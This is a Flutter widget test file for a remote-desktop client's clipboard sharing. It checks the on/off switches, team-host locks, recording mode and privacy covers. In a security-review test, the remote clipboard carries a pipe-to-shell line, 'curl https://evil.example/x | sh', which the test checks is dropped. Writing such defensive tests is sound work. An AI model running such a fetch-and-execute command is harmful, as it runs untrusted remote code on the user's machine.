// A remote screen's clipboard in its tab (4.0). On a
// computer: the toolbar's switch (on for a host of the person's own space, off
// for a team's, none on a team host locked off), the remote's text written
// here while on and never under recording mode, this computer's sent as the
// picture takes the keyboard when it changed, the choice kept for the host on
// this device. On a phone: the menu's switch and Paste to remote (the phone's
// clipboard read only then), none on a locked team host.
import 'dart:async';
import 'dart:convert';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:xterm/xterm.dart';
import 'package:zest_native/screen.dart';
import 'package:zest_native/screen_testing.dart';
import 'package:zestssh/features/screens/desktop/screen_pane.dart';
import 'package:zestssh/features/screens/model/screen_options.dart';
import 'package:zestssh/features/screens/phone/phone_screen_view.dart';
import 'package:zestssh/features/screens/session/screen_clipboard.dart';
import 'package:zestssh/features/screens/session/screen_shell_service.dart';
import 'package:zestssh/features/screens/session/screen_target.dart';
import 'package:zestssh/features/screens/view/screen_privacy_cover.dart';
import 'package:zestssh/features/screens/view/screen_view.dart';
import 'package:zestssh/features/screens/window/screen_window_protocol.dart';
import 'package:zestssh/features/screens/window/screen_windows.dart';
import 'package:zestssh/l10n/generated/app_localizations.dart';
import 'package:zestssh/providers/core_providers.dart';
import 'package:zestssh/providers/settings_providers.dart';
import 'package:zestssh/providers/terminal_providers.dart';

import '../features/screens/screen_clipboard_test.dart' show FakeClipboardIo;
import '../features/screens/view/screen_view_fixture.dart';
import '../features/screens/window/fake_window_backend.dart';

class _Trust implements ScreenTrust {
  @override
  Future<String?> pinned() async => null;
  @override
  Future<bool> ask(ScreenCertificate presented, {String? previous}) async => true;
  @override
  Future<void> remember(ScreenCertificate cert) async {}
}

void main() {
  final en = lookupAppLocalizations(const Locale('en'));
  late FakeScreenNative native;
  late FakeClipboardIo io;
  late SharedPreferences prefs;

  setUp(() async {
    native = FakeScreenNative();
    io = FakeClipboardIo();
    SharedPreferences.setMockInitialValues({});
    prefs = await SharedPreferences.getInstance();
    ScreenPane.debugDecodeTile = syncDecode;
    ScreenPane.debugClipboard = io;
  });
  tearDown(() {
    ScreenPane.debugDecodeTile = null;
    ScreenPane.debugClipboard = null;
  });

  Future<(ScreenShellService, FakeScreenSession)> connectScreen(WidgetTester tester,
      {ScreenOptions options = ScreenOptions.defaults, bool inTeam = false}) async {
    final toServer = StreamController<List<int>>();
    final fromServer = StreamController<Uint8List>();
    addTearDown(() {
      unawaited(toServer.close());
      unawaited(fromServer.close());
    });
    final shell = ScreenShellService(
      target: const DirectTlsTarget('192.0.2.30', 5900),
      trust: _Trust(),
      native: native,
      options: options,
      inTeam: inTeam,
      connectionId: 'c-desk',
      openDirect: (_, _) async => ScreenChannel(fromServer.stream, toServer.sink),
    );
    final connecting = shell.connect();
    for (var i = 0; i < 5; i++) {
      await tester.pump();
      if (native.sessions.isNotEmpty) break;
    }
    final engine = native.sessions.single;
    engine.connect(name: 'demo-desktop', width: 800, height: 500);
    await tester.pump();
    await connecting;
    return (shell, engine);
  }

  Future<void> pumpPane(WidgetTester tester, ScreenShellService shell, {bool recording = false, bool visible = true}) async {
    tester.view.physicalSize = const Size(1400, 900);
    tester.view.devicePixelRatio = 1;
    addTearDown(tester.view.reset);
    final state = SessionState(
      status: SessionStatus.connected,
      connectionId: 'c-desk',
      connectionLabel: 'Demo desktop',
      session: TerminalSession(
        id: 's1',
        connectionId: 'c-desk',
        terminal: Terminal(),
        shell: shell,
        startedAt: DateTime(2026, 11, 8),
      ),
    );
    await tester.pumpWidget(ProviderScope(
      overrides: [
        sharedPreferencesProvider.overrideWithValue(prefs),
        recordingModeProvider.overrideWith((ref) => recording),
      ],
      child: MaterialApp(
        localizationsDelegates: AppLocalizations.localizationsDelegates,
        supportedLocales: AppLocalizations.supportedLocales,
        locale: const Locale('en'),
        home: Scaffold(body: ScreenPane(sessionId: 's1', sessionState: state, front: visible, visible: visible)),
      ),
    ));
    await tester.pump();
    await tester.pump();
  }

  Future<void> remoteCopies(WidgetTester tester, FakeScreenSession engine, String text) async {
    engine.emit(ScreenEventKind.clipboard, data: utf8.encode(text));
    await tester.pump();
    await tester.pump();
  }

  Future<void> finish(WidgetTester tester) async {
    await tester.pumpWidget(const SizedBox());
    await tester.pump(const Duration(minutes: 1));
  }

  final button = find.byKey(const ValueKey('screen-toolbar-clipboard'));

  group('a computer\'s tab', () {
    testWidgets('a screen in a window of its own: the clipboard goes on being shared by its tab; the text of the '
        'remote comes here whatever the main window shows, and the text of this computer goes when the picture in '
        'the window takes the keyboard', (tester) async {
      final backend = FakeWindowBackend();
      final before = ScreenWindows.instance.backend;
      ScreenWindows.instance.backend = backend;
      addTearDown(() async {
        await ScreenWindows.instance.closeAll();
        ScreenWindows.instance.backend = before;
      });
      io.text = 'copied here';
      final (shell, engine) = await connectScreen(tester);
      await pumpPane(tester, shell);
      expect(engine.clipboard, ['copied here']);
      final session = shell.session!;
      expect(
          await ScreenWindows.instance.open(
              session, ScreenWindowPayload(sessionId: 's1', handle: session.handle, protocol: ScreenProtocol.vnc)),
          isTrue);
      await tester.pump();
      expect(find.byKey(const ValueKey('screen-in-own-window')), findsOneWidget);
      final window = backend.payloads.keys.single;

      // The window has not said it is in front: nothing is taken from the
      // remote, and its picture taking the keyboard sends nothing.
      await remoteCopies(tester, engine, 'copied behind');
      expect(io.written, isEmpty);
      io.text = 'copied here later';
      await ScreenWindows.instance.handle(kScreenWindowFocusMethod, null, window);
      await tester.pump();
      expect(engine.clipboard, ['copied here']);

      // It comes to the front: this computer's text goes, and what the remote
      // copies is taken, though the tab shows no picture now.
      await ScreenWindows.instance.handle(kScreenWindowFrontMethod, true, window);
      await tester.pump();
      expect(engine.clipboard, ['copied here', 'copied here later']);
      await remoteCopies(tester, engine, 'copied there');
      expect(io.written, ['copied there']);

      // This computer copies, and the picture in the window takes the keyboard.
      io.text = 'copied here last';
      await ScreenWindows.instance.handle(kScreenWindowFocusMethod, null, window);
      await tester.pump();
      expect(engine.clipboard, ['copied here', 'copied here later', 'copied here last']);
      // Another window saying so is not heard.
      io.text = 'something else';
      await ScreenWindows.instance.handle(kScreenWindowFocusMethod, null, window + 9);
      await tester.pump();
      expect(engine.clipboard, hasLength(3));

      // Behind another program again: the remote can put nothing here.
      await ScreenWindows.instance.handle(kScreenWindowFrontMethod, false, window);
      await remoteCopies(tester, engine, 'copied while away');
      expect(io.written, ['copied there']);

      // Back in its tab, nothing is left listening for the window.
      await ScreenWindows.instance.bringBack('s1');
      await tester.pump();
      await ScreenWindows.instance.handle(kScreenWindowFocusMethod, null, window);
      await tester.pump();
      expect(tester.takeException(), isNull);
      await finish(tester);
    });

    testWidgets('a host of the person\'s own space: shared; the remote\'s text comes here; this computer\'s goes as '
        'the picture takes the keyboard, once for each change; the switch turns it off for the host on this device',
        (tester) async {
      io.text = 'copied here';
      final (shell, engine) = await connectScreen(tester);
      await pumpPane(tester, shell);
      expect(button, findsOneWidget);
      expect(find.byTooltip(en.screenClipboardTurnOff), findsOneWidget);
      // The picture took the keyboard as the tab opened: this computer's clipboard went.
      expect(engine.clipboard, ['copied here']);

      await remoteCopies(tester, engine, 'copied there');
      expect(io.written, ['copied there']);
      // The keyboard away and back: the remote's own text is not sent back.
      final focus = tester.widget<ScreenView>(find.byType(ScreenView)).focusNode!;
      focus.unfocus();
      await tester.pump();
      focus.requestFocus();
      await tester.pump();
      await tester.pump();
      expect(engine.clipboard, ['copied here']);
      io.text = 'copied here again';
      focus.unfocus();
      await tester.pump();
      focus.requestFocus();
      await tester.pump();
      await tester.pump();
      expect(engine.clipboard, ['copied here', 'copied here again']);

      await tester.tap(button);
      await tester.pump();
      expect(prefs.getString(screenClipboardPrefKey('c-desk')), 'off');
      expect(find.byTooltip(en.screenClipboardTurnOn), findsOneWidget);
      await remoteCopies(tester, engine, 'not taken');
      expect(io.written, ['copied there']);
      await tester.pump(const Duration(seconds: 6));
      await finish(tester);
    });

    // Found in a security review: the app switcher's snapshot.
    testWidgets("a computer's tab is not covered as the app leaves (its switcher shows live windows); a tablet's is",
        (tester) async {
      addTearDown(() => ScreenPrivacyCover.debugMobile = null);
      final cover = find.byKey(const ValueKey('screen-privacy-cover'));
      final (shell, _) = await connectScreen(tester);
      for (final mobile in [false, true]) {
        ScreenPrivacyCover.debugMobile = mobile;
        await pumpPane(tester, shell);
        expect(find.byType(ScreenPrivacyCover), findsOneWidget);
        expect(cover, findsNothing);
        tester.binding.handleAppLifecycleStateChanged(AppLifecycleState.inactive);
        await tester.pump();
        expect(cover, mobile ? findsOneWidget : findsNothing, reason: 'mobile: $mobile');
        tester.binding.handleAppLifecycleStateChanged(AppLifecycleState.resumed);
        await tester.pump();
        expect(cover, findsNothing);
        await tester.pump(const Duration(seconds: 6));
        await finish(tester);
      }
      await shell.disconnect();
    });

    // Found in a security review.
    testWidgets("the remote's text is not taken while its tab is behind another, or another program is in front: "
        'dropped, not written later', (tester) async {
      final (shell, engine) = await connectScreen(tester);
      await pumpPane(tester, shell, visible: false);
      await remoteCopies(tester, engine, 'curl https://evil.example/x | sh');
      expect(io.written, isEmpty, reason: 'a tab behind another');
      await pumpPane(tester, shell);
      await tester.pump();
      expect(io.written, isEmpty, reason: 'not kept for when it is in front');
      tester.binding.handleAppLifecycleStateChanged(AppLifecycleState.inactive);
      await tester.pump();
      await remoteCopies(tester, engine, 'not taken: another program in front');
      expect(io.written, isEmpty);
      tester.binding.handleAppLifecycleStateChanged(AppLifecycleState.resumed);
      await tester.pump();
      await remoteCopies(tester, engine, 'taken: seen');
      expect(io.written, ['taken: seen']);
      await tester.pump(const Duration(seconds: 6));
      await finish(tester);
    });

    testWidgets('a team\'s host: not shared until its member turns it on here, then this computer remembers it',
        (tester) async {
      final (shell, engine) = await connectScreen(tester, inTeam: true);
      io.text = 'kept here';
      await pumpPane(tester, shell);
      expect(find.byTooltip(en.screenClipboardTurnOn), findsOneWidget);
      expect(engine.clipboard, isEmpty);
      expect(io.reads, 0, reason: 'not even read while off');
      await remoteCopies(tester, engine, 'not taken');
      expect(io.written, isEmpty);

      await tester.tap(button);
      await tester.pump();
      expect(prefs.getString(screenClipboardPrefKey('c-desk')), 'on');
      await remoteCopies(tester, engine, 'taken now');
      expect(io.written, ['taken now']);
      await tester.pump(const Duration(seconds: 6));
      await finish(tester);
    });

    testWidgets('a team host its editor locked off: no switch, nothing either way, whatever this computer chose '
        'before', (tester) async {
      await prefs.setString(screenClipboardPrefKey('c-desk'), 'on');
      final (shell, engine) = await connectScreen(tester,
          inTeam: true, options: const ScreenOptions(clipboard: true, clipboardLocked: true));
      io.text = 'kept here';
      await pumpPane(tester, shell);
      expect(button, findsNothing);
      expect(engine.clipboard, isEmpty);
      await remoteCopies(tester, engine, 'not taken');
      expect(io.written, isEmpty);
      await finish(tester);
    });

    testWidgets('recording mode: the remote\'s clipboard is not taken, and nothing of it is shown', (tester) async {
      final (shell, engine) = await connectScreen(tester);
      await pumpPane(tester, shell, recording: true);
      await remoteCopies(tester, engine, 'hunter22');
      expect(io.written, isEmpty);
      expect(find.textContaining('hunter22'), findsNothing);
      await finish(tester);
    });
  });

  group('a phone\'s page', () {
    Future<(ScreenSession, FakeScreenSession)> open(WidgetTester tester) async {
      final session = ScreenSession.open(const ScreenConnectOptions.vnc(), native: native);
      final engine = native.sessions.last;
      engine.connect(width: 800, height: 500);
      await tester.pump();
      addTearDown(session.close);
      return (session, engine);
    }

    Future<void> pumpPhone(WidgetTester tester, ScreenSession session,
        {ScreenOptions options = ScreenOptions.defaults, bool inTeam = false}) async {
      tester.view.devicePixelRatio = 1;
      tester.view.physicalSize = const Size(390, 844);
      tester.view.padding = const FakeViewPadding(top: 47, bottom: 34);
      addTearDown(tester.view.reset);
      tester.binding.defaultBinaryMessenger.setMockMethodCallHandler(SystemChannels.platform, (call) async => null);
      addTearDown(() => tester.binding.defaultBinaryMessenger.setMockMethodCallHandler(SystemChannels.platform, null));
      await tester.pumpWidget(ProviderScope(
        overrides: [
          sharedPreferencesProvider.overrideWithValue(prefs),
          recordingModeProvider.overrideWith((ref) => false),
        ],
        child: MaterialApp(
          localizationsDelegates: AppLocalizations.localizationsDelegates,
          supportedLocales: AppLocalizations.supportedLocales,
          locale: const Locale('en'),
          home: PhoneScreenView(
            sessionId: 's1',
            connectionId: 'c-desk',
            label: 'Demo desktop',
            session: session,
            options: options,
            inTeam: inTeam,
            onBack: () {},
            onDisconnect: () {},
            decodeTile: syncDecode,
            clipboardIo: io,
          ),
        ),
      ));
      await tester.pump();
    }

    Future<void> openMenu(WidgetTester tester) async {
      // The bar back first, where it hid itself.
      final show = find.byKey(const ValueKey('screen-phone-show-toolbar'));
      if (show.evaluate().isNotEmpty) {
        await tester.tap(show);
        await tester.pumpAndSettle();
      }
      await tester.tap(find.byKey(const ValueKey('screen-phone-more')));
      await tester.pumpAndSettle();
    }

    /// A row of the open panel, scrolled to.
    Future<Finder> panelRow(WidgetTester tester, String action) async {
      final row = find.byKey(ValueKey('screen-panel-$action'));
      await tester.scrollUntilVisible(row, 120,
          scrollable: find.descendant(
              of: find.byKey(const ValueKey('screen-panel-list')), matching: find.byType(Scrollable)));
      await tester.ensureVisible(row);
      await tester.pumpAndSettle();
      return row;
    }

    bool switchOn(WidgetTester tester, Finder row) =>
        tester.widget<Switch>(find.descendant(of: row, matching: find.byType(Switch))).value;

    // Found in a security review.
    testWidgets("the picture is covered as the app leaves, so the app switcher's snapshot holds none of it; uncovered "
        'once back', (tester) async {
      ScreenPrivacyCover.debugMobile = true;
      addTearDown(() => ScreenPrivacyCover.debugMobile = null);
      final (session, _) = await open(tester);
      await pumpPhone(tester, session);
      final cover = find.byKey(const ValueKey('screen-privacy-cover'));
      expect(cover, findsNothing);
      for (final state in [AppLifecycleState.inactive, AppLifecycleState.hidden, AppLifecycleState.paused]) {
        tester.binding.handleAppLifecycleStateChanged(state);
        await tester.pump();
        expect(cover, findsOneWidget, reason: state.name);
      }
      for (final state in [AppLifecycleState.hidden, AppLifecycleState.inactive, AppLifecycleState.resumed]) {
        tester.binding.handleAppLifecycleStateChanged(state);
        await tester.pump();
      }
      expect(cover, findsNothing);
      await tester.pumpWidget(const SizedBox());
      await tester.pump(const Duration(minutes: 1));
    });

    testWidgets('the phone\'s clipboard is never read by itself; Paste to remote sends it; the remote\'s comes here; '
        'the switch turns it off', (tester) async {
      io.text = 'on the phone';
      final (session, engine) = await open(tester);
      await pumpPhone(tester, session);
      expect(io.reads, 0, reason: 'never read in the background');
      await remoteCopies(tester, engine, 'from the remote');
      expect(io.written, ['from the remote']);
      io.text = 'on the phone';

      await openMenu(tester);
      expect(switchOn(tester, await panelRow(tester, 'clipboard')), isTrue);
      await tester.tap(await panelRow(tester, 'pasteToRemote'));
      await tester.pumpAndSettle();
      expect(engine.clipboard, ['on the phone']);
      expect(find.text(en.screenPastedToRemote), findsOneWidget);
      // (Past the bar's own 4 s, so it never hides under an open menu.)
      await tester.pump(const Duration(seconds: 5));

      io.text = null;
      await openMenu(tester);
      await tester.tap(await panelRow(tester, 'pasteToRemote'));
      await tester.pumpAndSettle();
      expect(find.text(en.screenClipboardEmpty), findsOneWidget);
      // (Past the bar's own 4 s, so it never hides under an open menu.)
      await tester.pump(const Duration(seconds: 5));

      await openMenu(tester);
      await tester.tap(await panelRow(tester, 'clipboard'));
      await tester.pumpAndSettle();
      expect(prefs.getString(screenClipboardPrefKey('c-desk')), 'off');
      // The switch keeps the panel open, and Paste to remote says why it cannot now.
      expect(switchOn(tester, await panelRow(tester, 'clipboard')), isFalse);
      final paste = await panelRow(tester, 'pasteToRemote');
      expect(find.descendant(of: paste, matching: find.text(en.screenWhyNotClipboardOff)), findsOneWidget,
          reason: 'nothing pastes while it is off');
      await tester.tap(paste);
      await tester.pumpAndSettle();
      expect(engine.clipboard, ['on the phone'], reason: 'a greyed row sends nothing');
      await tester.tapAt(const Offset(10, 800));
      await tester.pumpAndSettle();
      await remoteCopies(tester, engine, 'not taken');
      expect(io.written, ['from the remote']);
      await tester.tapAt(const Offset(10, 800));
      await tester.pumpAndSettle();
      await tester.pump(const Duration(seconds: 5));
    });

    testWidgets('a team host: off until turned on; locked off by its editor: neither item', (tester) async {
      final (session, engine) = await open(tester);
      await pumpPhone(tester, session, inTeam: true);
      await openMenu(tester);
      expect(switchOn(tester, await panelRow(tester, 'clipboard')), isFalse);
      await tester.tapAt(const Offset(10, 800));
      await tester.pumpAndSettle();
      await remoteCopies(tester, engine, 'not taken');
      expect(io.written, isEmpty);
      await tester.pump(const Duration(seconds: 5));

      final (locked, _) = await open(tester);
      await pumpPhone(tester, locked, inTeam: true, options: const ScreenOptions(clipboardLocked: true));
      await openMenu(tester);
      expect(find.byKey(const ValueKey('screen-panel-group-clipboard')), findsNothing);
      expect(find.byKey(const ValueKey('screen-panel-clipboard'), skipOffstage: false), findsNothing);
      expect(find.byKey(const ValueKey('screen-panel-pasteToRemote'), skipOffstage: false), findsNothing);
      await tester.tapAt(const Offset(10, 800));
      await tester.pumpAndSettle();
      await tester.pump(const Duration(seconds: 5));
    });
  });
}
